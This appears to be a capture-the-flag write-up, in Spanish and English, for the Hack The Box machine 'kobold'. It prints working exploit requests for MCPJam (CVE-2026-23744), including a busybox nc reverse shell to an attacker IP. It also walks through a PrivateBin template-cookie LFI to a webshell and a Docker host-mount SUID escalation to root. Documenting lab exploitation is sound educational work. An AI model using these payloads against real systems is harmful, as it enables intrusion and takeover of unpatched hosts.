@@ -1,0 +1,382 @@
+<!DOCTYPE html>
+<html lang="es" data-theme="light">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>kobold | Writeup</title>
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link
+        href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;700&family=Inter:wght@400;600;800&display=swap"
+        rel="stylesheet">
+    <link rel="stylesheet" href="../../index.css">
+</head>
+
+<body>
+    <nav class="top-nav">
+        <div class="container">
+            <div class="nav-content">
+                <div class="nav-left">
+                    <a href="../../index.html" class="back-link" title="Back to home">←</a>
+                    <h1 data-i18n="site-title">KDW_LABS</h1>
+                </div>
+                <div class="nav-controls">
+                    <button id="theme-toggle" class="icon-btn" aria-label="Toggle theme">
+                        <span class="theme-icon">🌙</span>
+                    </button>
+                    <button id="lang-toggle" class="icon-btn" aria-label="Toggle language">
+                        <span>EN</span>
+                    </button>
+                </div>
+            </div>
+        </div>
+    </nav>
+
+    <main class="container">
+        <header class="machine-header">
+            <h1 class="machine-title">kobold</h1>
+            <div class="machine-meta">
+                <span class="badge badge-platform">HTB</span>
+                <span class="badge badge-difficulty-easy">easy</span>
+            </div>
+        </header>
+
+        <article class="machine-content">
+            <!-- SPANISH CONTENT -->
+            <div id="content-es" class="lang-content">
+                <div class="machine-summary">
+                    <h2 data-i18n="summary-title">Resumen de Explotación</h2>
+                    <p><strong>Resumen del proceso:</strong> La máquina objetivo exponía varios servicios: un servidor <code>nginx</code> en los puertos 80/443 que redirigía a <code>kobold.htb</code>, y un servicio <code>Arcane</code> (gestor de contenedores Docker similar a Portainer) en el puerto 3552. Mediante fuzzing de virtual hosts se descubrieron dos subdominios adicionales: <code>mcp.kobold.htb</code> ejecutando MCPJam 1.4.2 y <code>bin.kobold.htb</code> ejecutando PrivateBin 2.0.2.</p>
+
+                    <p>El acceso inicial se consiguió explotando el CVE-2026-23744 en MCPJam 1.4.2, donde el endpoint <code>/api/mcp/connect</code> carecía de autenticación y permitía ejecución de comandos arbitrarios, obteniendo una shell como el usuario <code>ben</code>.</p>
+
+                    <p>Para el movimiento lateral, se aprovechó una vulnerabilidad de LFI en PrivateBin (CVE-2025-64714) que, combinada con la capacidad de escribir archivos en el directorio <code>/privatebin-data/data/</code> compartido con el contenedor Docker, permitió obtener RCE dentro del contenedor de PrivateBin. Desde allí se extrajeron credenciales del fichero de configuración <code>/srv/cfg/conf.php</code> que dieron acceso al panel de Arcane.</p>
+
+                    <p>Finalmente, la escalada a root se realizó creando un volumen en Arcane que mapeaba la raíz del host (<code>/</code>) y montándolo en un nuevo contenedor. Desde dentro del contenedor privilegiado se asignó el bit SUID a <code>/bin/bash</code> del host, permitiendo obtener una shell como <code>root</code>.</p>
+
+                    <p><strong>Tecnologías/Exploits:</strong> MCPJam RCE sin autenticación (CVE-2026-23744), PrivateBin LFI mediante cookie <code>template</code> (CVE-2025-64714), escalada de privilegios mediante Arcane Docker manager con montaje de volúmenes del host.</p>
+                </div>
+                <hr class="summary-divider">
+
+                <h2>Reconocimiento Inicial</h2>
+                <p>Comienzo con un escaneo de <code>nmap</code> para identificar los puertos abiertos y los servicios que se ejecutan en la máquina objetivo:</p>
+                <pre><code class="language-plaintext">PORT      STATE SERVICE  VERSION
+22/tcp    open  ssh      OpenSSH 9.6p1 Ubuntu 3ubuntu13.15 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey:
+|   256 8c:45:12:36:03:61:de:0f:0b:2b:c3:9b:2a:92:59:a1 (ECDSA)
+|_  256 d2:3c:bf:ed:55:4a:52:13:b5:34:d2:fb:8f:e4:93:bd (ED25519)
+80/tcp    open  http     nginx 1.24.0 (Ubuntu)
+|_http-title: Did not follow redirect to https://kobold.htb/
+|_http-server-header: nginx/1.24.0 (Ubuntu)
+443/tcp   open  ssl/http nginx 1.24.0 (Ubuntu)
+|_http-title: Did not follow redirect to https://kobold.htb/
+| ssl-cert: Subject: commonName=kobold.htb
+| Subject Alternative Name: DNS:kobold.htb, DNS:*.kobold.htb
+3552/tcp  open  http     Golang net/http server
+|_http-title: Site doesn't have a title (text/html; charset=utf-8).</code></pre>
+
+                <p>Añado <code>kobold.htb</code> al fichero <code>/etc/hosts</code>. El escaneo revela varios servicios interesantes: SSH en el puerto 22, un servidor <code>nginx</code> en los puertos 80 y 443 que redirige a <code>https://kobold.htb/</code>, y un servicio web en Go en el puerto 3552.</p>
+
+                <p>Un detalle muy relevante del certificado SSL es el registro <code>DNS:*.kobold.htb</code>, que indica la posible existencia de virtual hosts. Aunque el puerto 53 (DNS) está cerrado, este wildcard sugiere que merece la pena hacer fuzzing de subdominios.</p>
+
+                <h2>Enumeración de Virtual Hosts</h2>
+                <p>Lanzo <code>wfuzz</code> para descubrir virtual hosts configurados bajo <code>kobold.htb</code>:</p>
+                <pre><code class="language-bash">wfuzz -c -z file,/usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt --hw 10 -H "Host: FUZZ.kobold.htb" https://kobold.htb</code></pre>
+
+                <p>Rápidamente encuentro dos subdominios:</p>
+                <pre><code class="language-plaintext">000000606:   200   14 L    34 W     466 Ch    "mcp"
+000009838:   200   385 L   1607 W   24392 Ch  "bin"</code></pre>
+
+                <p>Añado ambos al <code>/etc/hosts</code> y procedo a investigar cada servicio.</p>
+
+                <h2>Enumeración de Servicios</h2>
+                <h3>Arcane - Puerto 3552</h3>
+                <p>En el puerto 3552 se encuentra un servicio llamado <code>Arcane</code>, que es un gestor de contenedores Docker similar a Portainer:</p>
+                <p><img src="./media/image4.png" alt="Interfaz de login de Arcane, gestor de contenedores Docker, mostrando la versión 1.13.0 en el footer" /></p>
+
+                <p>En el footer se indica la versión <code>1.13.0</code>. Busco vulnerabilidades y encuentro un RCE reciente, pero está parcheado precisamente en esta versión: <a href="https://dbugs.ptsecurity.com/vulnerability/PT-2026-3097">https://dbugs.ptsecurity.com/vulnerability/PT-2026-3097</a>. De momento descarto esta vía.</p>
+
+                <h3>PrivateBin - bin.kobold.htb</h3>
+                <p>En <code>bin.kobold.htb</code> se ejecuta <code>PrivateBin</code> versión 2.0.2, un software similar al mítico Pastebin que permite compartir texto de forma temporal y cifrada.</p>
+
+                <p>Para PrivateBin encuentro una vulnerabilidad de LFI que afecta a esta versión: <a href="https://nvd.nist.gov/vuln/detail/CVE-2025-64714">CVE-2025-64714</a>. La vulnerabilidad permite incluir archivos PHP arbitrarios si <code>templateselection</code> está habilitado en la configuración, ya que el servidor confía en la cookie <code>template</code> y la utiliza para incluir el fichero PHP referenciado.</p>
+
+                <blockquote>
+                    <p>"If <code>templateselection</code> is enabled in the configuration, the server trusts the <code>template</code> cookie and includes the referenced PHP file. An attacker can read sensitive data or, if they manage to drop a PHP file elsewhere, gain remote code execution."</p>
+                </blockquote>
+
+                <p>En la página oficial de PrivateBin se detallan los pasos de reproducción: <a href="https://privatebin.info/reports/vulnerability-2025-11-12-templates.html">https://privatebin.info/reports/vulnerability-2025-11-12-templates.html</a></p>
+
+                <p>Los pasos son sencillos: enviar una petición con una cookie <code>template</code> maliciosa como <code>template=../cfg/conf</code>, donde la ruta relativa apunte a un archivo PHP (sin extensión). Se indica que no es posible acceder a otros archivos PHP de PrivateBin ya que da error 500, pero quizá se podría acceder a otros scripts PHP del sistema. Esto es interesante, pero antes de tirar por este camino investigo el servicio MCPJam.</p>
+
+                <h3>MCPJam - mcp.kobold.htb</h3>
+                <p>En <code>mcp.kobold.htb</code> se ejecuta <code>MCPJam</code> versión 1.4.2. MCPJam es un software para configurar servidores MCP (Model Context Protocol) que se utilizan con LLMs para potenciar su efectividad dándoles contexto adicional concreto, por ejemplo de algún tipo de tecnología específica.</p>
+
+                <p>Para MCPJam encuentro una vulnerabilidad reciente de RCE que afecta exactamente a la versión 1.4.2: <a href="https://www.incibe.es/en/incibe-cert/early-warning/vulnerabilities/cve-2026-23744">CVE-2026-23744</a>.</p>
+
+                <p>El problema es que el endpoint <code>/api/mcp/connect</code> no tiene ningún tipo de autenticación y permite ejecutar comandos arbitrarios. Además, hasta esta versión, el servicio se exponía por defecto en todas las interfaces de red (<code>0.0.0.0</code>), lo que significa que cualquier dispositivo en la red tiene RCE sobre una máquina que hostee este servicio.</p>
+
+                <p>Encuentro una PoC sencilla en este advisory: <a href="https://github.com/advisories/GHSA-232v-j27c-5pp6">https://github.com/advisories/GHSA-232v-j27c-5pp6</a></p>
+
+                <h2>Acceso Inicial - Explotando MCPJam (CVE-2026-23744)</h2>
+                <p>Siguiendo la PoC, primero confirmo la ejecución remota de código enviando un <code>curl</code> a mi servidor:</p>
+                <pre><code class="language-bash">curl https://mcp.kobold.htb/api/mcp/connect \
+  --header "Content-Type: application/json" \
+  --data '{"serverConfig":{"command":"curl","args":["10.10.14.129"],"env":{}},"serverId":"mytest"}' -k</code></pre>
+
+                <p>La respuesta del servidor indica un error de conexión MCP (ya que <code>curl</code> no es un servidor MCP válido), pero en mi servidor HTTP recibo la petición, confirmando el RCE:</p>
+                <pre><code class="language-bash">python3 -m http.server 80
+Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
+10.129.14.176 - - "GET / HTTP/1.1" 200 -</code></pre>
+
+                <p>Ahora envío el payload con una reverse shell usando <code>busybox nc</code>:</p>
+                <pre><code class="language-bash">curl https://mcp.kobold.htb/api/mcp/connect \
+  --header "Content-Type: application/json" \
+  --data '{"serverConfig":{"command":"busybox","args":["nc", "10.10.14.129", "443", "-e", "sh"],"env":{}},"serverId":"mytest"}' -k</code></pre>
+
+                <p>Consigo acceso como el usuario <code>ben</code> y obtengo la primera flag.</p>
+
+                <h2>Enumeración Interna</h2>
+                <p>Una vez dentro, compruebo la información del usuario y los demás usuarios del sistema:</p>
+                <pre><code class="language-bash">ben@kobold:~$ id
+uid=1001(ben) gid=1001(ben) groups=1001(ben),37(operator)
+
+ben@kobold:~$ id alice
+uid=1002(alice) gid=1002(alice) groups=1002(alice),37(operator),111(docker)</code></pre>
+
+                <p>Tanto <code>ben</code> como <code>alice</code> están en el grupo <code>operator</code>. Además, <code>alice</code> pertenece al grupo <code>docker</code>, lo cual es muy interesante de cara a la escalada de privilegios.</p>
+
+                <p>Encuentro tres puertos TCP expuestos localmente:</p>
+                <pre><code class="language-plaintext">tcp  LISTEN  0  511   127.0.0.1:6274   0.0.0.0:*
+tcp  LISTEN  0  4096  127.0.0.1:8080   0.0.0.0:*
+tcp  LISTEN  0  4096  127.0.0.1:43699  0.0.0.0:*</code></pre>
+
+                <p>Tras buscar por la máquina, lo único que me llama la atención es que el grupo <code>operator</code> es dueño de un directorio en la raíz: <code>/privatebin-data</code>. Dentro hay varios directorios, pero a <code>cfg</code> no tengo permiso de lectura. A <code>certs</code> y <code>data</code> sí tengo acceso, aunque los archivos que contienen no parecen tener información útil directamente.</p>
+
+                <h2>Movimiento Lateral - PrivateBin LFI a RCE (CVE-2025-64714)</h2>
+                <p>Recupero la vulnerabilidad de LFI que encontré antes en PrivateBin. Ahora que tengo acceso al sistema de archivos, pruebo a crear un archivo <code>shell.php</code> con una webshell en <code>/tmp</code> y <code>/dev/shm</code>, e intento acceder modificando el contenido de la cookie <code>template</code> como indica la PoC, pero no funciona.</p>
+
+                <p>Esto es extraño, ya que cualquier usuario debería tener acceso a esos directorios. Lo que se me ocurre es que PrivateBin esté corriendo en un contenedor Docker (ya que sé que Docker existe en la máquina), y que algunos ficheros bajo <code>/privatebin-data</code> se estén sincronizando con los contenidos del contenedor mediante un volumen compartido.</p>
+
+                <p>Si mi suposición es correcta, puedo colocar la webshell en <code>/privatebin-data/data/</code> y luego indicar ese archivo usando el valor <code>../data/shell</code> en la cookie <code>template</code>. Pruebo a hacerlo y efectivamente, consigo una webshell funcional:</p>
+                <p><img src="./media/image1.png" alt="Webshell PHP funcionando a través de la vulnerabilidad LFI de PrivateBin, mostrando ejecución de comandos exitosa" /></p>
+
+                <p>Mediante esta webshell envío una reverse shell y accedo al contenedor, donde aparezco en <code>/var/www</code>. Busco el archivo de configuración con <code>find</code>:</p>
+                <pre><code class="language-bash">find / -iname "*conf.php*" 2>/dev/null
+/srv/cfg/conf.php</code></pre>
+
+                <p>Dentro de este archivo de configuración encuentro unas credenciales:</p>
+                <pre><code class="language-plaintext">ComplexP@sswordAdmin1928</code></pre>
+
+                <p>Pruebo las credenciales para los usuarios del sistema pero no funcionan. Sin embargo, sí funcionan para el servicio de <code>Arcane</code> del puerto 3552.</p>
+
+                <h2>Escalada de Privilegios - Arcane Docker Manager</h2>
+                <p>A partir de aquí la escalada de privilegios es clara: tener acceso a un gestor de contenedores Docker con la capacidad de crear volúmenes y contenedores equivale a tener acceso root en el host. La estrategia es:</p>
+                <ol>
+                    <li>Crear un volumen que mapee el contenido completo del host en el contenedor</li>
+                    <li>Crear un contenedor con una imagen base existente, root como usuario por defecto, y que use ese volumen</li>
+                    <li>Desde dentro del contenedor, asignar el bit SUID a la bash del host para escalar a root</li>
+                </ol>
+
+                <p>Primero creo el volumen con las opciones <code>type=none</code>, <code>o=bind</code> y <code>device=/</code> para montar la raíz del host:</p>
+                <p><img src="./media/image2.png" alt="Creación del volumen en Arcane con opciones de montaje bind apuntando a la raíz del sistema de archivos del host" /></p>
+
+                <p>Luego creo el contenedor indicando <code>root</code> como usuario por defecto y seleccionando una imagen existente en Docker:</p>
+                <p><img src="./media/image5.png" alt="Creación del contenedor en Arcane con root como usuario por defecto y una imagen base existente" /></p>
+
+                <p>Y le asigno el volumen que he creado, mapeándolo a un directorio dentro del contenedor:</p>
+                <p><img src="./media/image3.png" alt="Asignación del volumen creado al contenedor, mapeando la raíz del host a un punto de montaje dentro del contenedor" /></p>
+
+                <p>Ahora, desde dentro del contenedor puedo ver el sistema de archivos completo del host:</p>
+                <pre><code class="language-bash">/var/www # ls -lah /xd
+total 100K
+drwxr-xr-x  22 root root 4.0K Mar 16 20:57 .
+drwxr-xr-x   1 root root 4.0K Mar 22 22:28 ..
+drwxr-xr-x   3 root root 4.0K Mar 16 20:57 app
+lrwxrwxrwx   1 root root    7 Apr 22  2024 bin -> usr/bin
+drwxr-xr-x   2 root root 4.0K Feb 21  2025 boot
+dr-xr-xr-x   2 root root 4.0K Mar 15 21:23 cdrom</code></pre>
+
+                <p>Simplemente le añado el bit SUID a la <code>bash</code> del sistema host:</p>
+                <pre><code class="language-bash">/var/www # chmod u+s /xd/bin/bash</code></pre>
+
+                <p>De vuelta como el usuario <code>ben</code>, ejecuto una bash privilegiada y consigo acceso como root:</p>
+                <pre><code class="language-bash">ben@kobold:/privatebin-data/data$ bash -p
+bash-5.2# whoami
+root</code></pre>
+
+                <p>Con esto obtengo la flag de root y completo la máquina.</p>
+            </div>
+
+            <!-- ENGLISH CONTENT -->
+            <div id="content-en" class="lang-content" style="display:none;">
+                <div class="machine-summary">
+                    <h2 data-i18n="summary-title">Exploitation Summary</h2>
+                    <p><strong>Exploitation process:</strong> The target machine exposed several services: an <code>nginx</code> server on ports 80/443 redirecting to <code>kobold.htb</code>, and an <code>Arcane</code> service (Docker container manager similar to Portainer) on port 3552. Through virtual host fuzzing, two additional subdomains were discovered: <code>mcp.kobold.htb</code> running MCPJam 1.4.2 and <code>bin.kobold.htb</code> running PrivateBin 2.0.2.</p>
+
+                    <p>Initial access was achieved by exploiting CVE-2026-23744 in MCPJam 1.4.2, where the <code>/api/mcp/connect</code> endpoint lacked authentication and allowed arbitrary command execution, obtaining a shell as the <code>ben</code> user.</p>
+
+                    <p>For lateral movement, a PrivateBin LFI vulnerability (CVE-2025-64714) was leveraged. Combined with the ability to write files to the <code>/privatebin-data/data/</code> directory shared with the Docker container, this allowed achieving RCE inside the PrivateBin container. From there, credentials were extracted from the configuration file at <code>/srv/cfg/conf.php</code>, which granted access to the Arcane panel.</p>
+
+                    <p>Finally, privilege escalation to root was accomplished by creating a volume in Arcane that mapped the host's root filesystem (<code>/</code>) and mounting it in a new container. From inside the privileged container, the SUID bit was set on the host's <code>/bin/bash</code>, enabling a root shell.</p>
+
+                    <p><strong>Technologies/Exploits:</strong> MCPJam unauthenticated RCE (CVE-2026-23744), PrivateBin LFI via <code>template</code> cookie (CVE-2025-64714), privilege escalation via Arcane Docker manager with host volume mounting.</p>
+                </div>
+                <hr class="summary-divider">
+
+                <h2>Initial Reconnaissance</h2>
+                <p>Starting with an <code>nmap</code> scan to identify open ports and services running on the target machine:</p>
+                <pre><code class="language-plaintext">PORT      STATE SERVICE  VERSION
+22/tcp    open  ssh      OpenSSH 9.6p1 Ubuntu 3ubuntu13.15 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey:
+|   256 8c:45:12:36:03:61:de:0f:0b:2b:c3:9b:2a:92:59:a1 (ECDSA)
+|_  256 d2:3c:bf:ed:55:4a:52:13:b5:34:d2:fb:8f:e4:93:bd (ED25519)
+80/tcp    open  http     nginx 1.24.0 (Ubuntu)
+|_http-title: Did not follow redirect to https://kobold.htb/
+|_http-server-header: nginx/1.24.0 (Ubuntu)
+443/tcp   open  ssl/http nginx 1.24.0 (Ubuntu)
+|_http-title: Did not follow redirect to https://kobold.htb/
+| ssl-cert: Subject: commonName=kobold.htb
+| Subject Alternative Name: DNS:kobold.htb, DNS:*.kobold.htb
+3552/tcp  open  http     Golang net/http server
+|_http-title: Site doesn't have a title (text/html; charset=utf-8).</code></pre>
+
+                <p>I add <code>kobold.htb</code> to my <code>/etc/hosts</code> file. The scan reveals several interesting services: SSH on port 22, an <code>nginx</code> server on ports 80 and 443 redirecting to <code>https://kobold.htb/</code>, and a Go-based web service on port 3552.</p>
+
+                <p>A very relevant detail from the SSL certificate is the <code>DNS:*.kobold.htb</code> record, indicating the possible existence of virtual hosts. Although port 53 (DNS) is closed, this wildcard suggests it's worth fuzzing for subdomains.</p>
+
+                <h2>Virtual Host Enumeration</h2>
+                <p>I run <code>wfuzz</code> to discover virtual hosts configured under <code>kobold.htb</code>:</p>
+                <pre><code class="language-bash">wfuzz -c -z file,/usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt --hw 10 -H "Host: FUZZ.kobold.htb" https://kobold.htb</code></pre>
+
+                <p>Two subdomains are quickly found:</p>
+                <pre><code class="language-plaintext">000000606:   200   14 L    34 W     466 Ch    "mcp"
+000009838:   200   385 L   1607 W   24392 Ch  "bin"</code></pre>
+
+                <p>I add both to <code>/etc/hosts</code> and proceed to investigate each service.</p>
+
+                <h2>Service Enumeration</h2>
+                <h3>Arcane - Port 3552</h3>
+                <p>Port 3552 hosts a service called <code>Arcane</code>, which is a Docker container manager similar to Portainer:</p>
+                <p><img src="./media/image4.png" alt="Arcane login interface, a Docker container manager, showing version 1.13.0 in the footer" /></p>
+
+                <p>The footer indicates version <code>1.13.0</code>. I search for vulnerabilities and find a recent RCE, but it's patched in precisely this version: <a href="https://dbugs.ptsecurity.com/vulnerability/PT-2026-3097">https://dbugs.ptsecurity.com/vulnerability/PT-2026-3097</a>. I discard this path for now.</p>
+
+                <h3>PrivateBin - bin.kobold.htb</h3>
+                <p><code>bin.kobold.htb</code> runs <code>PrivateBin</code> version 2.0.2, a software similar to the classic Pastebin that allows sharing text in a temporary and encrypted manner.</p>
+
+                <p>For PrivateBin, I find an LFI vulnerability affecting this version: <a href="https://nvd.nist.gov/vuln/detail/CVE-2025-64714">CVE-2025-64714</a>. The vulnerability allows including arbitrary PHP files if <code>templateselection</code> is enabled in the configuration, since the server trusts the <code>template</code> cookie and uses it to include the referenced PHP file.</p>
+
+                <blockquote>
+                    <p>"If <code>templateselection</code> is enabled in the configuration, the server trusts the <code>template</code> cookie and includes the referenced PHP file. An attacker can read sensitive data or, if they manage to drop a PHP file elsewhere, gain remote code execution."</p>
+                </blockquote>
+
+                <p>The official PrivateBin page details the reproduction steps: <a href="https://privatebin.info/reports/vulnerability-2025-11-12-templates.html">https://privatebin.info/reports/vulnerability-2025-11-12-templates.html</a></p>
+
+                <p>The steps are straightforward: send a request with a malicious <code>template</code> cookie like <code>template=../cfg/conf</code>, where the relative path points to a PHP file (without its extension). It's noted that accessing other PrivateBin PHP files results in a 500 error, but it might be possible to access other PHP scripts on the system. This is interesting, but before pursuing this path I investigate the MCPJam service.</p>
+
+                <h3>MCPJam - mcp.kobold.htb</h3>
+                <p><code>mcp.kobold.htb</code> runs <code>MCPJam</code> version 1.4.2. MCPJam is a software for configuring MCP (Model Context Protocol) servers used with LLMs to enhance their effectiveness by providing specific additional context, for example about a particular technology.</p>
+
+                <p>For MCPJam I find a recent RCE vulnerability affecting exactly version 1.4.2: <a href="https://www.incibe.es/en/incibe-cert/early-warning/vulnerabilities/cve-2026-23744">CVE-2026-23744</a>.</p>
+
+                <p>The issue is that the <code>/api/mcp/connect</code> endpoint has no authentication whatsoever and allows arbitrary command execution. Furthermore, up to this version, the service was exposed by default on all network interfaces (<code>0.0.0.0</code>), meaning any device on the network has RCE on a machine hosting this service.</p>
+
+                <p>I find a simple PoC in this advisory: <a href="https://github.com/advisories/GHSA-232v-j27c-5pp6">https://github.com/advisories/GHSA-232v-j27c-5pp6</a></p>
+
+                <h2>Initial Access - Exploiting MCPJam (CVE-2026-23744)</h2>
+                <p>Following the PoC, I first confirm remote code execution by sending a <code>curl</code> request to my server:</p>
+                <pre><code class="language-bash">curl https://mcp.kobold.htb/api/mcp/connect \
+  --header "Content-Type: application/json" \
+  --data '{"serverConfig":{"command":"curl","args":["10.10.14.129"],"env":{}},"serverId":"mytest"}' -k</code></pre>
+
+                <p>The server response indicates an MCP connection error (since <code>curl</code> isn't a valid MCP server), but on my HTTP server I receive the request, confirming RCE:</p>
+                <pre><code class="language-bash">python3 -m http.server 80
+Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
+10.129.14.176 - - "GET / HTTP/1.1" 200 -</code></pre>
+
+                <p>Now I send the payload with a reverse shell using <code>busybox nc</code>:</p>
+                <pre><code class="language-bash">curl https://mcp.kobold.htb/api/mcp/connect \
+  --header "Content-Type: application/json" \
+  --data '{"serverConfig":{"command":"busybox","args":["nc", "10.10.14.129", "443", "-e", "sh"],"env":{}},"serverId":"mytest"}' -k</code></pre>
+
+                <p>I gain access as the <code>ben</code> user and obtain the first flag.</p>
+
+                <h2>Internal Enumeration</h2>
+                <p>Once inside, I check user information and other system users:</p>
+                <pre><code class="language-bash">ben@kobold:~$ id
+uid=1001(ben) gid=1001(ben) groups=1001(ben),37(operator)
+
+ben@kobold:~$ id alice
+uid=1002(alice) gid=1002(alice) groups=1002(alice),37(operator),111(docker)</code></pre>
+
+                <p>Both <code>ben</code> and <code>alice</code> are in the <code>operator</code> group. Additionally, <code>alice</code> belongs to the <code>docker</code> group, which is very interesting for privilege escalation.</p>
+
+                <p>I find three TCP ports exposed locally:</p>
+                <pre><code class="language-plaintext">tcp  LISTEN  0  511   127.0.0.1:6274   0.0.0.0:*
+tcp  LISTEN  0  4096  127.0.0.1:8080   0.0.0.0:*
+tcp  LISTEN  0  4096  127.0.0.1:43699  0.0.0.0:*</code></pre>
+
+                <p>After searching around the machine, the only notable finding is that the <code>operator</code> group owns a directory at the root: <code>/privatebin-data</code>. Inside there are several directories, but I don't have read permissions on <code>cfg</code>. I can access <code>certs</code> and <code>data</code>, though the files within don't contain directly useful information.</p>
+
+                <h2>Lateral Movement - PrivateBin LFI to RCE (CVE-2025-64714)</h2>
+                <p>I revisit the PrivateBin LFI vulnerability I found earlier. Now that I have filesystem access, I try creating a <code>shell.php</code> webshell file in <code>/tmp</code> and <code>/dev/shm</code>, then attempt to access it by modifying the <code>template</code> cookie value as the PoC indicates, but it doesn't work.</p>
+
+                <p>This is strange since any user should have global access to those directories. What occurs to me is that PrivateBin is running inside a Docker container (since I know Docker exists on the machine), and some files under <code>/privatebin-data</code> are being synced with the container's contents through a shared volume.</p>
+
+                <p>If my assumption is correct, I can place the webshell in <code>/privatebin-data/data/</code> and then reference that file using the value <code>../data/shell</code> in the <code>template</code> cookie. I try this and indeed, I now have a working webshell:</p>
+                <p><img src="./media/image1.png" alt="PHP webshell working through the PrivateBin LFI vulnerability, showing successful command execution" /></p>
+
+                <p>Through this webshell I send a reverse shell and access the container, landing in <code>/var/www</code>. I search for the configuration file with <code>find</code>:</p>
+                <pre><code class="language-bash">find / -iname "*conf.php*" 2>/dev/null
+/srv/cfg/conf.php</code></pre>
+
+                <p>Inside this configuration file I find credentials:</p>
+                <pre><code class="language-plaintext">ComplexP@sswordAdmin1928</code></pre>
+
+                <p>I try the credentials for system users but they don't work. However, they do work for the <code>Arcane</code> service on port 3552.</p>
+
+                <h2>Privilege Escalation - Arcane Docker Manager</h2>
+                <p>From here the privilege escalation path is clear: having access to a Docker container manager with the ability to create volumes and containers is equivalent to having root access on the host. The strategy is:</p>
+                <ol>
+                    <li>Create a volume that maps the entire host content into the container</li>
+                    <li>Create a container with an existing base image, root as the default user, and using that volume</li>
+                    <li>From inside the container, set the SUID bit on the host's bash to escalate to root</li>
+                </ol>
+
+                <p>First I create the volume with options <code>type=none</code>, <code>o=bind</code> and <code>device=/</code> to mount the host's root:</p>
+                <p><img src="./media/image2.png" alt="Volume creation in Arcane with bind mount options pointing to the host's root filesystem" /></p>
+
+                <p>Then I create the container specifying <code>root</code> as the default user and selecting an existing Docker image:</p>
+                <p><img src="./media/image5.png" alt="Container creation in Arcane with root as the default user and an existing base image" /></p>
+
+                <p>And I assign the volume I created, mapping it to a directory inside the container:</p>
+                <p><img src="./media/image3.png" alt="Volume assignment to the container, mapping the host root to a mount point inside the container" /></p>
+
+                <p>Now, from inside the container I can see the host's complete filesystem:</p>
+                <pre><code class="language-bash">/var/www # ls -lah /xd
+total 100K
+drwxr-xr-x  22 root root 4.0K Mar 16 20:57 .
+drwxr-xr-x   1 root root 4.0K Mar 22 22:28 ..
+drwxr-xr-x   3 root root 4.0K Mar 16 20:57 app
+lrwxrwxrwx   1 root root    7 Apr 22  2024 bin -> usr/bin
+drwxr-xr-x   2 root root 4.0K Feb 21  2025 boot
+dr-xr-xr-x   2 root root 4.0K Mar 15 21:23 cdrom</code></pre>
+
+                <p>I simply set the SUID bit on the host system's <code>bash</code>:</p>
+                <pre><code class="language-bash">/var/www # chmod u+s /xd/bin/bash</code></pre>
+
+                <p>Back as the <code>ben</code> user, I execute a privileged bash and gain root access:</p>
+                <pre><code class="language-bash">ben@kobold:/privatebin-data/data$ bash -p
+bash-5.2# whoami
+root</code></pre>
+
+                <p>With this I obtain the root flag and complete the machine.</p>
+            </div>
+        </article>
+    </main>
+    <script src="../../index.js"></script>
+</body>
+
+</html>
